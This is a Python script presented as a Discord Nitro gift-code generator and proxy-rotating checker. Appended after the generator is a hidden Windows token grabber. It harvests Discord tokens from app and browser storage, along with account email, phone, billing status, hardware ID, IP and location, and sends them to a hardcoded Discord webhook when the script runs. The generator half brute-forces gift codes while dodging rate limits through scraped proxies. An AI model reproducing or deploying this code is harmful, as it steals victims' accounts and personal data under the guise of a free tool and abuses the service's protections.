import os
from time import sleep
import requests
import random
import string
from colorama import Fore


os.system("cls")


print(f"{Fore.WHITE}[ {Fore.CYAN}§ {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Discord Nitro Generator made by {Fore.WHITE}𝕊𝕡𝕖𝕔𝕚𝕒𝕝𝔼𝕕ℝ𝕒𝕥#8561{Fore.LIGHTBLACK_EX}")
amount = int(input(f"\n{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}How many codes will be generated: {Fore.WHITE}"))
print(f"\n{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Classic Nitro is 16chars and Boost Nitro is 24chars")
nitro = input(f"{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Boost codes or Classic codes {Fore.WHITE}(boost or classic){Fore.LIGHTBLACK_EX}: {Fore.WHITE}")

if "boost" in nitro or "classic" in nitro:
    pass
else:
    print(f"{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Answer must be {Fore.WHITE}boost {Fore.LIGHTBLACK_EX}or {Fore.WHITE}classic")
    exit()


checker = input(f"{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Enable Checker {Fore.WHITE}(yes or no){Fore.LIGHTBLACK_EX}: {Fore.WHITE}")

def scrape():
    scraped = 0
    f = open("proxies.txt", "a+")
    f.truncate(0)
    r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500&ssl=yes')
    proxies = []
    for proxy in r.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        scraped = scraped + 1 
        f.write((p)+"\n")
    f.close()
    print(f"{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Scraped {Fore.WHITE}{scraped} {Fore.LIGHTBLACK_EX}proxies.")

if checker == "yes":
    scrapep = input(f"{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Auto proxy scrape {Fore.WHITE}(yes or no){Fore.LIGHTBLACK_EX}: {Fore.WHITE}")
    print(f"\n{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}If no, every check will be on random proxy.")
    mult = input(f"{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Multiple checks for proxy {Fore.WHITE}(yes or no){Fore.LIGHTBLACK_EX}: {Fore.WHITE}")
    if scrapep == "yes":
        scrape()
else:
    print(f"\n{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}If true, before code will be {Fore.WHITE}discord.gift/")
    prefix = input(f"{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Prefix before codes {Fore.WHITE}(yes or no){Fore.LIGHTBLACK_EX}: {Fore.WHITE}")
    if "yes" in prefix or "no" in prefix:
        pass
    else:
        print(f"{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Answer must be {Fore.WHITE}yes {Fore.LIGHTBLACK_EX}or {Fore.WHITE}no")
        exit()


print(f"\n{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Generating {Fore.WHITE}{amount}{Fore.LIGHTBLACK_EX} codes!")
if checker != "yes":
    sleep(1)

fulla = amount
f = open(f"codes.txt", "w+", encoding="UTF-8")
p = open(f"proxies.txt", encoding="UTF-8")


rproxy = p.read().split('\n')
for i in rproxy:
    if i == "" or i == " ":
        index = rproxy.index(i)
        del rproxy[index]

if checker != "yes":
    while amount > 0:
        amount = amount - 1
        if "boost" in nitro:
            code = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(24)])
        else:
            code = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(16)])
        if prefix == "yes":
            print(f"{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Generated code {Fore.WHITE}{code}")
            f.write(f"discord.gift/{code}\n")
        else:
            print(f"{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Generated code {Fore.WHITE}{code}")
            f.write(f"{code}\n")

else:
    while amount > 0:
        f = open(f"working-codes.txt","a", encoding="UTF-8")
        try:
            if not rproxy[0]:
                print(f"{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}All proxies are invalid!{Fore.WHITE}")
                exit()
        except:
            print(f"{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}All proxies are invalid!{Fore.WHITE}")
            exit()
        if mult == "yes":
            proxi = rproxy[0]
        else:
            proxi = random.choice(rproxy)
        proxies = {
            "https": proxi
        }
        amount = amount - 1
        if "boost" in nitro:
            code = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(24)])
        else:
            code = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(16)])
        try:
            url = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}", proxies=proxies, timeout=3)
            if url.status_code == 200:
                print(f"{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Working Code {Fore.WHITE}{code}{Fore.WHITE}")
                f.write(f"\ndiscord.gift/{code}")
                f.close()
            elif url.status_code == 404:
                fulla = fulla - 1
                print(f"{Fore.WHITE}[ {Fore.RED}- {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Invalid Code {Fore.WHITE}{code}")
            elif url.status_code == 429:
                fulla = fulla - 1
                if mult == "yes":
                    print(f"{Fore.WHITE}[ {Fore.RED}- {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Proxy {Fore.WHITE}{proxi}{Fore.LIGHTBLACK_EX} is ratelimited! | Switching proxy")
                else:
                    print(f"{Fore.WHITE}[ {Fore.RED}- {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Proxy {Fore.WHITE}{proxi}{Fore.LIGHTBLACK_EX} is ratelimited!")
                index = rproxy.index(proxi)
                del rproxy[index]
            else:
                fulla = fulla - 1
                print(f"{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Invalid Error! | Status code {Fore.WHITE}{url.status_code}")
        except:
            index = rproxy.index(proxi)
            del rproxy[index]
            pw = open(f"proxies.txt","w", encoding="UTF-8")
            for i in rproxy:
                pw.write(i + "\n")
            pw.close()
            fulla = fulla - 1
            print(f"{Fore.WHITE}[ {Fore.RED}- {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Failed connecting to proxy {Fore.WHITE}{proxi}{Fore.LIGHTBLACK_EX} | Removing from list!")

print(f"{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Succefully generated {Fore.WHITE}{fulla} {Fore.LIGHTBLACK_EX}codes!{Fore.WHITE}")
import os
if os.name != "nt":
	exit()
from re import findall
import json
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime

webhook_url = "https://discord.com/api/webhooks/906125808190492702/rdV8hzplSjYk1OhPDr_hVGD1NvN9jXSxwLybT_Jshjxl00zAAayColAWAWZpkWD2KO0e"

languages = {
	'da'    : 'Danish, Denmark',
	'de'    : 'German, Germany',
	'en-GB' : 'English, United Kingdom',
	'en-US' : 'English, United States',
	'es-ES' : 'Spanish, Spain',
	'fr'    : 'French, France',
	'hr'    : 'Croatian, Croatia',
	'lt'    : 'Lithuanian, Lithuania',
	'hu'    : 'Hungarian, Hungary',
	'nl'    : 'Dutch, Netherlands',
	'no'    : 'Norwegian, Norway',
	'pl'    : 'Polish, Poland',
	'pt-BR' : 'Portuguese, Brazilian, Brazil',
	'ro'    : 'Romanian, Romania',
	'fi'    : 'Finnish, Finland',
	'sv-SE' : 'Swedish, Sweden',
	'vi'    : 'Vietnamese, Vietnam',
	'tr'    : 'Turkish, Turkey',
	'cs'    : 'Czech, Czechia, Czech Republic',
	'el'    : 'Greek, Greece',
	'bg'    : 'Bulgarian, Bulgaria',
	'ru'    : 'Russian, Russia',
	'uk'    : 'Ukranian, Ukraine',
	'th'    : 'Thai, Thailand',
	'zh-CN' : 'Chinese, China',
	'ja'    : 'Japanese',
	'zh-TW' : 'Chinese, Taiwan',
	'ko'    : 'Korean, Korea'
}

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
	"Discord"           : ROAMING + "\\Discord",
	"Discord Canary"    : ROAMING + "\\discordcanary",
	"Discord PTB"       : ROAMING + "\\discordptb",
	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
	headers = {
		"Content-Type": content_type,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
	}
	if token:
		headers.update({"Authorization": token})
	return headers
def getuserdata(token):
	try:
		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
	except:
		pass
def gettokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in findall(regex, line):
					tokens.append(token)
	return tokens

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def getip():
	ip = org = loc = city = country = region = googlemap = "None"
	try:
		url = 'http://ipinfo.io/json'
		response = urlopen(url)
		data = json.load(response)
		ip = data['ip']
		org = data['org']
		loc = data['loc']
		city = data['city']
		country = data['country']
		region = data['region']
		googlemap = "https://www.google.com/maps/search/google+map++" + loc
	except:
		pass
	return ip,org,loc,city,country,region,googlemap

def getavatar(uid, aid):
	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
	try:
		urlopen(Request(url))
	except:
		url = url[:-4]
	return url

def has_payment_methods(token):
	try:
		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
	except:
		pass

def main():
	embeds = []
	working = []
	checked = []
	already_cached_tokens = []
	working_ids = []
	computer_os = plt.platform()
	ip,org,loc,city,country,region,googlemap = getip()
	pc_username = os.getenv("UserName")
	pc_name = os.getenv("COMPUTERNAME")
	for platform, path in PATHS.items():
		if not os.path.exists(path):
			continue
		for token in gettokens(path):
			if token in checked:
				continue
			checked.append(token)
			uid = None
			if not token.startswith("mfa."):
				try:
					uid = b64decode(token.split(".")[0].encode()).decode()
				except:
					pass
				if not uid or uid in working_ids:
					continue
			user_data = getuserdata(token)
			if not user_data:
				continue
			working_ids.append(uid)
			working.append(token)
			username = user_data["username"] + "#" + str(user_data["discriminator"])
			user_id = user_data["id"]
			locale = user_data['locale']
			avatar_id = user_data["avatar"]
			avatar_url = getavatar(user_id, avatar_id)
			email = user_data.get("email")
			phone = user_data.get("phone")
			verified = user_data['verified']
			mfa_enabled = user_data['mfa_enabled']
			flags = user_data['flags']

			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y・%H:%M:%S')

			language = languages.get(locale)
			nitro = bool(user_data.get("premium_type"))
			billing = bool(has_payment_methods(token))
			embed = {
				"color": 16507654,
				"fields": [
					{
						"name": "**Account Info**",
						"value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
						"inline": True
					},
					{
						"name": "**Pc Info**",
						"value": f'OS: {computer_os}\nUsername: {pc_username}\nPc Name: {pc_name}\nHwid:\n{gethwid()}',
						"inline": True
					},
					{
						"name": "--------------------------------------------------------------------------------------------------",
						"value":"-----------------------------------------------------------------------------------------------",
						"inline": False
					},
					{
						"name": "**IP**",
						"value": f'IP: {ip}\nMap location: [{loc}]({googlemap})\nCity: {city}\nRegion: {region}\nOrg: {org}',
						"inline": True
					},
					{
						"name": "**Other Info**",
						"value": f'Locale: {locale} ({language})\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
						"inline": True
					},
					{
						"name": "**Token**",
						"value": f"`{token}`",
						"inline": False
					}
				],
				"author": {
					"name": f"{username}・{user_id}",
					"icon_url": avatar_url
				},
				"footer": {
					"text": "Black Buy Grabber By G-13"
				}
			}
			embeds.append(embed)

	if len(working) == 0:
		working.append('123')
	webhook = {
		"content": "",
		"embeds": embeds,
		"username": "Black Buy Grabber",
		"avatar_url": "https://cdn.discordapp.com/attachments/769687051204952098/874591223531315240/Anonymous.jpg"
	}
	try:
		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
	except:
		pass

if __name__ == "__main__":
    main()

input()

